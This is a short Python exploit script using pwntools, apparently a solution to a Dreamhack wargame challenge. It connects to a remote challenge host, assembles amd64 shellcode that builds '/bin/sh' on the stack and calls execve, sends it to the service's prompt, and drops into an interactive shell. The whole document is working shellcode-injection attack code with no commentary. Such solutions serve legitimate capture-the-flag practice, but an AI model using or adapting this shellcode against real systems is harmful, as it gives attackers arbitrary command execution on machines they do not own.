from pwn import *

#p = process('./main')
p = remote('host3.dreamhack.games', 17794)

shellcode = asm(
    "push rax\n"
    "add rbx, 0x6e69622f\n" 
    "push rbx\n"
    "xor rbx, rbx\n"
    "add rbx, 0x68732f\n"
    "add rsp, 4\n"
    "add rsp, 8\n"
    "push rbx\n"
    "lea rdi, [rsp-0x4]\n"
    "add rax, 0x3b\n"
    "syscall\n"
    , arch = 'amd64')

print(shellcode)
p.sendafter(b' > ',shellcode)

p.interactive()